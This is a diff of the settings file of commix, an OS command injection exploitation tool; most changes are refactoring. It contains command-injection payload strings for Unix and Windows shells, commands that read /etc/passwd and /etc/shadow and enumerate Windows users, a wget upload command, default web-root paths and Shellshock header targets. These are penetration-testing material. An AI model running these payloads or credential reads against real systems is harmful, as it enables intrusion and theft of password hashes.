@@ -25,6 +25,28 @@ from datetime import datetime
 from src.core.compat import xrange
 from src.thirdparty.six.moves import urllib as _urllib
 from src.thirdparty.six.moves import reload_module as _reload_module
+
+# argv checks
+def sys_argv_checks():
+  tamper_index = None
+  for i in xrange(len(sys.argv)):
+    # Disable coloring
+    if sys.argv[i] == "--disable-coloring":
+      from src.utils import colors
+      colors.ENABLE_COLORING = False
+    """
+    Dirty hack from sqlmap [1], regarding merging of tamper script arguments (e.g. --tamper A --tamper B -> --tamper=A,B)
+    [1] https://github.com/sqlmapproject/sqlmap/commit/f4a0820dcb5fded8bc4d0363c91276eb9a3445ae
+    """
+    if sys.argv[i].startswith("--tamper"):
+      if tamper_index is None:
+        tamper_index = i if '=' in sys.argv[i] else (i + 1 if i + 1 < len(sys.argv) and not sys.argv[i + 1].startswith('-') else None)
+      else:
+        sys.argv[tamper_index] = "%s,%s" % (sys.argv[tamper_index], sys.argv[i].split('=')[1] if '=' in sys.argv[i] else (sys.argv[i + 1] if i + 1 < len(sys.argv) and not sys.argv[i + 1].startswith('-') else ""))
+        sys.argv[i] = ""
+
+# argv checks
+sys_argv_checks()
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 class HTTPMETHOD(object):
@@ -191,26 +213,19 @@ def command_execution_output(shell):
   result = Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL
   return result
 
-# argv checks
-def sys_argv_checks():
-  tamper_index = None
-  for i in xrange(len(sys.argv)):
-    # Disable coloring
-    if sys.argv[i] == "--disable-coloring":
-      from src.utils import colors
-      colors.ENABLE_COLORING = False
-    """
-    Dirty hack from sqlmap [1], regarding merging of tamper script arguments (e.g. --tamper A --tamper B -> --tamper=A,B)
-    [1] https://github.com/sqlmapproject/sqlmap/commit/f4a0820dcb5fded8bc4d0363c91276eb9a3445ae
-    """
-    if sys.argv[i].startswith("--tamper"):
-      if tamper_index is None:
-        tamper_index = i if '=' in sys.argv[i] else (i + 1 if i + 1 < len(sys.argv) and not sys.argv[i + 1].startswith('-') else None)
-      else:
-        sys.argv[tamper_index] = "%s,%s" % (sys.argv[tamper_index], sys.argv[i].split('=')[1] if '=' in sys.argv[i] else (sys.argv[i + 1] if i + 1 < len(sys.argv) and not sys.argv[i + 1].startswith('-') else ""))
-        sys.argv[i] = ""
+"""
+Print data to stdout
+"""
+def print_data_to_stdout(data):
+  if END_LINE.CR not in data and data != "." and data != " (done)":
+    data = data + END_LINE.LF
+  sys.stdout.write(data)
+  sys.stdout.flush()
 
-# argv input errors
+
+"""
+argv input errors
+"""
 def sys_argv_errors():
   _reload_module(sys)
   try:
@@ -222,17 +237,17 @@ def sys_argv_errors():
     # Check for illegal (non-console) quote characters.
     if len(sys.argv[i]) > 1 and all(ord(_) in xrange(0x2018, 0x2020) for _ in ((sys.argv[i].split('=', 1)[-1].strip() or ' ')[0], sys.argv[i][-1])):
         err_msg = "Illegal (non-console) quote characters ('" + sys.argv[i] + "')."
-        print(print_critical_msg(err_msg))
+        print_data_to_stdout(print_critical_msg(err_msg))
         raise SystemExit()
     # Check for illegal (non-console) comma characters.
     elif len(sys.argv[i]) > 1 and u"\uff0c" in sys.argv[i].split('=', 1)[-1]:
         err_msg = "Illegal (non-console) comma character ('" + sys.argv[i] + "')."
-        print(print_critical_msg(err_msg))
+        print_data_to_stdout(print_critical_msg(err_msg))
         raise SystemExit()
     # Check for potentially miswritten (illegal '=') short option.
     elif re.search(r"\A-\w=.+", sys.argv[i]):
         err_msg = "Potentially miswritten (illegal '=') short option detected ('" + sys.argv[i] + "')."
-        print(print_critical_msg(err_msg))
+        print_data_to_stdout(print_critical_msg(err_msg))
         raise SystemExit()
 
 # argv checks
@@ -247,7 +262,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "4.0"
-REVISION = "34"
+REVISION = "81"
 STABLE_RELEASE = False
 VERSION = "v"
 if STABLE_RELEASE:
@@ -258,9 +273,9 @@ else:
   COLOR_VERSION = Style.UNDERLINE + Fore.WHITE + VERSION + Style.RESET_ALL
 
 YEAR = "2014-2024"
-AUTHOR_TWITTER = "@ancst"
+AUTHOR_X_ACCOUNT = "@ancst"
 APPLICATION_URL = "https://commixproject.com"
-APPLICATION_TWITTER = "@commixproject"
+APPLICATION_X_ACCOUNT = "@commixproject"
 
 # Default User-Agent
 DEFAULT_USER_AGENT = APPLICATION + "/" + VERSION + " (" + APPLICATION_URL + ")"
@@ -321,13 +336,13 @@ class HEURISTIC_TEST(object):
 #Basic heuristic checks for command injections
 RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
-CALC_STRING = str(RAND_A) + "+" + str(RAND_B)
+CALC_STRING = str(RAND_A) + " %2B " + str(RAND_B)
 BASIC_STRING = "(" + CALC_STRING + ")"
-BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26%26echo $(" + BASIC_STRING + ")||echo $(" + BASIC_STRING + ")",
-                                   "|set /a " + BASIC_STRING + "&set /a " + BASIC_STRING
+BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")%26echo $(" + BASIC_STRING + ")|echo $(" + BASIC_STRING + ")" + RANDOM_STRING_GENERATOR ,
+                                   "|set /a " + BASIC_STRING + "%26set /a " + BASIC_STRING
                                    ]
 ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
-ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
+ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")%26echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")|echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
                                    "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL + " &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p=%i" + CMD_NUL
                                    ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
@@ -363,6 +378,7 @@ CODE_INJECTION_WARNINGS = ["eval()'d code", "runtime-created function", "usort()
 SKIP_CODE_INJECTIONS = False
 SKIP_COMMAND_INJECTIONS = False
 
+USER_DEFINED_URL_DATA = True
 # User-defined stored POST data.
 USER_DEFINED_POST_DATA = ""
 # Ignore user-defined stored POST data.
@@ -373,9 +389,19 @@ CUSTOM_INJECTION_MARKER_CHAR = "*"
 CUSTOM_INJECTION_MARKER = False
 ASTERISK_MARKER = "__ASTERISK__"
 PRE_CUSTOM_INJECTION_MARKER_CHAR = ""
+CUSTOM_INJECTION_MARKER_PARAMETERS_LIST = []
+
+class INJECTION_MARKER_LOCATION(object):
+  URL = False
+  DATA = False
+  COOKIE = False
+  HTTP_HEADERS = False
+  CUSTOM_HTTP_HEADERS = False
+
+SKIP_NON_CUSTOM = None
 
 # Testable parameter(s) - comma separated.
-TEST_PARAMETER = ""
+TESTABLE_PARAMETERS_LIST = []
 TESTABLE_PARAMETERS = None
 
 # Skip testing for given parameter(s) - comma separated.
@@ -386,10 +412,13 @@ SCHEME = ""
 
 class OS(object):
   UNIX = "unix"
-  WINDOWS = "win"
+  WINDOWS = "windows"
 
 # Default target host OS (Unix-like)
 TARGET_OS = OS.UNIX
+
+IDENTIFIED_TARGET_OS = False
+IGNORE_IDENTIFIED_OS = None
 
 # Verbosity level: 0-1 (default 0)
 VERBOSITY_LEVEL = 0
@@ -484,6 +513,7 @@ SUFFIXES_LVL1 = [""]
 SUFFIXES_LVL2 = SEPARATORS_LVL1
 SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'", "\"", " #", "//", "\\\\"]
 
+
 # Bad combination of prefix and separator
 JUNK_COMBINATION = [SEPARATORS_LVL1[i] + SEPARATORS_LVL1[j] for i in range(len(SEPARATORS_LVL1)) for j in range(len(SEPARATORS_LVL1))]
 
@@ -567,7 +597,7 @@ WIN_CURRENT_USER = "echo %USERNAME%"
 HOSTNAME = "hostname"
 WIN_HOSTNAME = "echo %COMPUTERNAME%"
 
-# Check if current user has excessive privileges
+# Check if Current user is privileged
 # Unix-like: root
 IS_ROOT = "echo $(id -u)"
 # Windows: admin
@@ -606,8 +636,7 @@ FILE_UPLOAD = "wget "
 # /etc/passwd
 PASSWD_FILE = "/etc/passwd"
 
-SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE
-EVAL_SYS_USERS = "awk -F ':' '{print \$1}{print \$3}{print \$6}' " + PASSWD_FILE
+SYS_USERS = EVAL_SYS_USERS  = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE
 
 # Exports users of localgroup
 WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)]))"
@@ -617,7 +646,7 @@ DEFAULT_WIN_USERS = ["Administrator", "DefaultAccount", "Guest"]
 SHADOW_FILE = "/etc/shadow"
 SYS_PASSES = FILE_READ + SHADOW_FILE
 
-WIN_REPLACE_WHITESPACE = "-replace('\s+',' '))"
+WIN_REPLACE_WHITESPACE = r"-replace('\s+',' '))"
 
 # Accepts 'YES','YE','Y','yes','ye','y'
 CHOICE_YES = ['YES','YE','Y','yes','ye','y']
@@ -629,7 +658,7 @@ CHOICE_NO = ['NO','N','no','n']
 CHOICE_QUIT = ['QUIT','Q','quit','q']
 
 # Accepts 'W','w','U','u','Q','q'
-CHOICE_OS = ['W','w','U','u','Q','q']
+CHOICE_OS = ['W','w','U','u','Q','q','N','n']
 
 # Accepts 'C','c','S','s','Q','q','a','A','n','N'
 CHOICE_PROCEED = ['C','c','S','s','Q','q','a','A','n','N']
@@ -639,6 +668,22 @@ AVAILABLE_SHELLS = ["python"]
 
 # Available injection techniques.
 AVAILABLE_TECHNIQUES = ['c','e','t','f']
+
+# Supported injection types
+class INJECTION_TYPE(object):
+  RESULTS_BASED_CI = "results-based OS command injection"
+  RESULTS_BASED_CE = "results-based dynamic code evaluation"
+  BLIND = "blind OS command injection"
+  SEMI_BLIND = "semi-blind OS command injection"
+
+# Supported injection techniques
+class INJECTION_TECHNIQUE(object):
+  CLASSIC = "classic command injection technique"
+  DYNAMIC_CODE = "dynamic code evaluation technique"
+  TIME_BASED = "time-based command injection technique"
+  FILE_BASED = "file-based command injection technique"
+  TEMP_FILE_BASED = "tempfile-based injection technique"
+
 USER_SUPPLIED_TECHNIQUE = False
 SKIP_TECHNIQUES = False
 
@@ -717,7 +762,7 @@ CUSTOM_HEADER_NAME = ""
 CUSTOM_HEADER_VALUE = ""
 
 # Valid URL format check
-VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,310})?"
+VALID_URL_FORMAT = r"https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,310})?"
 
 VALID_URL = True
 
@@ -962,6 +1007,8 @@ HEX_RECOGNITION_REGEX = r'^(0[xX])?[0-9a-fA-F]+$'
 # GET parameters recognition
 GET_PARAMETERS_REGEX = r"(.*?)\?(.+)"
 
+DIRECTORY_REGEX = r'(?:/[^/]+)+?/\w+\.\w+'
+
 # TFB Decimal
 TFB_DECIMAL = False
 
@@ -1127,7 +1174,13 @@ HTTP_ERROR_CODES = [  BAD_REQUEST,
 HTTP_ERROR_CODES_SUM = []
 
 # End line
-END_LINE = ["\r", "\n", "\r\n"]
+class END_LINE:
+  CR = "\r"
+  LF = "\n"
+  CRLF = "\r\n"
+
+# List of end lines
+END_LINES_LIST = [attr for attr in dir(END_LINE) if not callable(getattr(END_LINE, attr)) and not attr.startswith("__")]
 
 # Check for updates on start up.
 CHECK_FOR_UPDATES_ON_START = True
@@ -1206,8 +1259,8 @@ NAGGING_DAYS = 31
 
 TARGET_URL = ""
 DOC_ROOT_TARGET_MARK = "%TARGET%"
-WINDOWS_DEFAULT_DOC_ROOTS = ["C:\\\\Inetpub\\wwwroot", "C:\\\\xampp\\htdocs", "C:\\\\wamp\\www"]
-LINUX_DEFAULT_DOC_ROOTS = ["/var/www/" + DOC_ROOT_TARGET_MARK + "/public_html", "/var/www", "/var/www/html", "/var/www/htdocs", "/usr/local/apache2/htdocs", "/usr/local/www/data", "/usr/share/nginx", "/var/apache2/htdocs", "/var/www/nginx-default", "/srv/www/htdocs"]  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout
+WINDOWS_DEFAULT_DOC_ROOTS = ["C:\\\\Inetpub\\wwwroot\\", "C:\\\\Inetpub\\wwwroot\\", "C:\\\\xampp\\htdocs\\", "C:\\\\wamp\\www\\"]
+LINUX_DEFAULT_DOC_ROOTS = ["/var/www/" + DOC_ROOT_TARGET_MARK + "/public_html/", "/var/www/" + DOC_ROOT_TARGET_MARK + "/", "/usr/local/apache2/htdocs/", "/usr/local/www/data/", "/usr/share/nginx/", "/var/apache2/htdocs/", "/var/www/nginx-default/", "/srv/www/htdocs/"]  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout
 
 DEFINED_WEBROOT = RECHECK_FILE_FOR_EXTRACTION = False
 
@@ -1249,10 +1302,11 @@ ACCEPT_VALUE = "*/*"
 
 # HTTP Headers
 HTTP_HEADERS = [ USER_AGENT.lower(), REFERER.lower(), HOST.lower() ]
+SHELLSHOCK_HTTP_HEADERS =[ COOKIE, USER_AGENT, REFERER ]
 
 # Regular expression used for ignoring some special chars
 IGNORE_SPECIAL_CHAR_REGEX = "[^/()A-Za-z0-9.:,_+]"
-IGNORE_JSON_CHAR_REGEX = "[{}\"\[\]]"
+IGNORE_JSON_CHAR_REGEX = r"[{}\"\[\]]"
 
 PERFORM_CRACKING = False
 
@@ -1291,6 +1345,8 @@ IGNORE_CODE = []
 DEFAULT_CRAWLING_DEPTH = 1
 
 SITEMAP_CHECK = None
+
+SITEMAP_XML_FILE = "sitemap.xml"
 
 FOLLOW_REDIRECT = True
 
